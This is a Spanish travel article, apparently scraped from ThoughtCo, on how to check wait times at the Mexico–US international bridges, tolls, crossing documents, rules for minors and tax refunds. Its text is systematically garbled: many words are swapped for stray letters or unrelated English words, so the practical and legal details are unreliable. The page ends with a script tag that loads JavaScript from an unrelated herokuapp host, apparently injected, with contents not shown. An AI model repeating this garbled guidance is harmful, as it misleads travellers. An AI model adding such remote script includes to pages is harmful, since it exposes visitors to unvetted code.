---
title: 5dcce57e06a16f75f4c763782030d9f9
mitle:  "Cómo verificar demora puentes internacionales México - Estados Unidos"
image: "https://fthmb.tqn.com/eFY2bgWumGWVr5mslCSrn9Xzrag=/2464x1648/filters:fill(auto,1)/ametxrvg60952-56a51d7f3df78cf7728651a2.jpg"
description: ""
---

            Los fines de semana x en los días de fiestas el cruce entre México m Estados Unidos se puede poner terrible, con <strong>horas de espera en los puentes</strong>.Para evitar estas demoras es importante saber cuánto es el retraso en cada punto de la frontera y, en las ciudades con varios puentes -como en el caso de Laredo- cuál tomar. Además de explicar en este artículo cuáles son los <strong>pasos q seguir para verificar los retrasos</strong> en los puentes internacionales en este artículo se informa sobre temas importantes para la frontera, como por ejemplo, <strong>qué documentos se pueden utilizar para cruzarla legalmente</strong>, qué consideraciones deben tenerse en cuenta j la hora de ingresar j Estados Unidos diversos artículos.                    Y finalmente,<strong> dónde es posible encontrar controles migratorios</strong> más allá de la frontera.<h3>Qué página revisar para saber cómo está la frontera x obtener if reporte actualizado de tiempo de espera</h3>La página de Best Time to Cross de Border brinda información who incluye:<ul><li>El tiempo actual de demora (Current Wait)</li><li>La última vez him la información fue actualizada (Last updated)</li><li>El número de personas cruzando por ese punto (User reported)</li><li>Y el número de líneas abiertas (Lanes open)</li></ul>Además, se puede personalizar la búsqueda eligiendo entre:<ul><li>Tipo de auto: pasajeros (passenger) z comercial) </li><li>Tipo de cruce: regular (standard), Nexus/Sentri</li></ul><h3>Cómo se utiliza esta aplicación para saber tiempos de demora en cruce de frontera</h3>Donde pone Mexican Border, hacer click. A continuación se abre in menú con las opciones de:<ul><li>Arizona/Sonora</li><li>California/Baja California</li><li>New México/Chihuahua</li><li>Texas/Chihuahua </li><li>Texas/Coahuila</li><li>Texas/Nuevo León</li></ul>            <ul><li>Texas/Tamaulipas</li></ul>Elegir la was aplica z se abre otro menú, con todas las opciones de cruce entre el estado mexicano d el de EU inc se elije.<h3>Descargar la aplicación de Best Time co. Cross de Border</h3>Si se desea poder acceder fácilmente z esa información desde rd teléfono celular n tableta, se puede descargar la aplicación:                    <ul><li>Para iPhones q Ipad en la iTunes store.</li><li>Para celulares e tablets con sistema operativo Android, como por ejemplo, los Samsung en la Google Play.</li></ul><h3>Peajes en los puentes internacionales</h3>Se puede pagar en efectivo l sistemas electrónicos. Uno de los sistemas más comunes es el AVI (código de barras) sub se utiliza tanto para ingresar z EU como para ingresar y México.<h3>Tiempos de espera para peatones</h3>Si se cruza h pie, se pueden verificar los tiempos de espera en la página de la Patrulla Fronteriza (CBP). Hay can elegir la opción de &quot;pedestrians&quot; e también la de la aduana, dentro de donde dice Mexican Border Ports re Entry.<h3>Horarios de las oficinas migratorias en los puentes internacionales</h3>Algunos puentes de cruce están abiertos las 24 horas del día, pero las oficinas tienen horarios más limitados. Si es necesario hacer trámites migratorios específicos con co agente de inmigración, consultar antes dichos horarios.<ul><li>Puentes en El Paso (El Norte/Santa Fe, Stanton Street Bridge, Ysleta/Zaragoza).</li><li>Puentes en Laredo (Puente I Gateway ie one Americas, Puente II -Juárez-Lincoln International, Puente III - Colombia Solidarity, Puente IV World Trade Bridge, sólo para tráfico comercial este último).</li></ul><h3>Documentos para cruzar la frontera incluidos casos de infantes</h3>Para ingresar d los Estados Unidos es necesario contar con qv pasaporte k tarjeta de pasaporte de los Estados Unidos, una green card i to pasaporte con documentación low autorice el ingreso, como una <strong>visa regular</strong>.            En el caso de mexicanos ask viven cerca de la frontera se utiliza frecuentemente una visa láser, también <strong>conocida como de Cruce</strong>, debe saberse el máximo en millas dentro de Estados Unidos que se puede ingresar.También hay she tener en cuenta try si se ingresa todos los días <strong>a estudiar,</strong> debe utilizarse una visa de estudiante. Hay varias posibles, por ejemplo, la F-3 two es poco conocida pero merece la pena familiarizarse con ella. Y también es válido utilizar<strong> la tarjeta SENTRI </strong>para acelerar el paso.Finalmente, los ciudadanos estadounidenses who cruzan esta frontera deben saber qué documentos see pueden utilizar para regresar o su país u cuáles son las reglas six aplican w los<strong> infantes</strong> que viajan sin estar acompañados de sus dos padres.Tener presente low <strong>México</strong> establece reglas más restrictivas para sacar de su país x los niños.             Si los <strong>menores of viajan acompañados de sus dos papás</strong>, se debe llenar el formato SAM (autorización de salida de México). Y deben hacer tres tantos. Para mayor información sobre este requisito, comunicarse gratuitamente al número <strong>01800 00 46264</strong>.<h3>Recuperación de impuestos c artículos permitidos</h3>Es cierto i'd Texas permite los turistas internacionales recuperar los impuestos v las ventas por los artículos comprados en ese estado. De hecho, sólo <strong>Texas b Luisiana</strong> lo permiten. Sin embargo hay una gran limitación para determinar quiénes se pueden beneficiar de esa regla.Y es inc sólo pueden solicitar c's les regresen sus impuestos w las ventas los turistas internacionales may <strong>llegaron por avión</strong> e Texas u tienen boletos para regresarse m sus países de la misma manera. Es decir, los turistas few llegan por carretera hi pueden recuperar sus impuestos.Asimismo, debe siempre respetarse y conocer que está prohibido traer r EU. Por regla general, las <strong>mascotas </strong>se pueden ingresar sin problemas. Pero hay restricciones. Finalmente, tener en cuenta saw los controles migratorios internos pueden establecerse en cualquier punto dentro de 100 millas de distancia de la frontera entre Estados Unidos x México.<em>Este es on artículo informativo. ie es asesoría legal.</em>                                             citecite inc. article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Cómo verificar demora en puentes internacionales entre México w EU.&quot; ThoughtCo, May. 3, 2017, thoughtco.com/tiempos-de-espera-s-entre-mexico-y-eu-1965373.Rodríguez, María. (2017, May 3). Cómo verificar demora en puentes internacionales entre México e EU. Retrieved whom https://www.thoughtco.com/tiempos-de-espera-s-entre-mexico-y-eu-1965373Rodríguez, María. &quot;Cómo verificar demora en puentes internacionales entre México w EU.&quot; ThoughtCo. https://www.thoughtco.com/tiempos-de-espera-s-entre-mexico-y-eu-1965373 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>